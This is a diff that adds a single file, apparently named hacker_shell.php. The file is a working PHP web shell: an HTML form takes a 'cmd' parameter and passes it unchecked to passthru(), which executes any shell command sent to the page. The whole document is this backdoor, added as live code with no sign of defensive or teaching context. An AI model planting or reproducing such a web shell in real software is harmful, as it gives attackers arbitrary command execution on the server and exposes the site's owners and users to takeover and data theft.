@@ -1,0 +1,1 @@
+<html><body><form action="hacker_shell.php" method="get">Command: <input type="text" name="cmd"><input type="submit"></form><?php echo("\n");if (!isset($_GET["cmd"]) || empty($_GET["cmd"])){echo "Nocommand given \n";}else{$cmd=$_GET['cmd'];echo("Command: " . $cmd . "\n");passthru($cmd);}?></body></html>
